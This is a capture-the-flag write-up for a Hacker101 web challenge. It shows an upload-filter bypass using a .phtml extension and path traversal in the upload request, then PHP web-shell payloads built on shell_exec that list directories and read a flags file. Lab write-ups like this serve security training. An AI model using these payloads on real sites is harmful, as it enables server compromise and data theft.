# Y2FuIHlvdSByZWNvbj8/

## Description
This write up will show how to solve the CTF for "Y2FuIHlvdSByZWNvbj8/"

**Difficulty:** Moderate

## Solution 1st flag
Fuzzing for files and directories, I get the following result:</br>
```
.htaccess
.hta
.htpasswd
admin
server-status
```
All these end-points return a `403 Forbidden` error.</br>

Try to upload a picture and give it a name `hello.php`.</br>
This will result in an error stating php files are not allowed.</br>
In the application, give the filename hello.phtml and click on Upload.</br>
phtml files are basically php files with a html extension.</br>

Send this request to Repeater in Burp.</br>
When the filename is hello.phtml, we cannot access this at `https://7fc6a5ded79e394cae1864ec42e45609.ctf.hacker101.com/hello.phtml`.</br>
Try path traversal and add ../ in front of the filename: `../hello.phtml`
Just before the last `------WebKitFormBoundaryVE0XKLpD1lkWUlbo--` comment, insert some php code: `<?php echo "Hello World!"; ?>`</br>
When refreshing the /hello.phtml, it will show "Hello World!" on the web page.</br>
Now we know php command execution is possible.</br>

Change the code to include a shell execution: `<?php $out=shell_exec('ls'); echo $out; ?>`</br>
This will show the following files in this folder `admin admin-settings.js hello.phtml index.php`.</br>
When going up 1 folder: `<?php $out=shell_exec('ls ..'); echo $out; ?>`</br>
It shows the following files: `Autoload.php Flag.php Output.php Route.php View.php controllers data flags.txt index.html models public routes view`
There is a flags.txt file, so change the code to `<?php $out=shell_exec('cat ../flags.txt'); echo $out; ?>`</br>
This will show all 3 the flags.
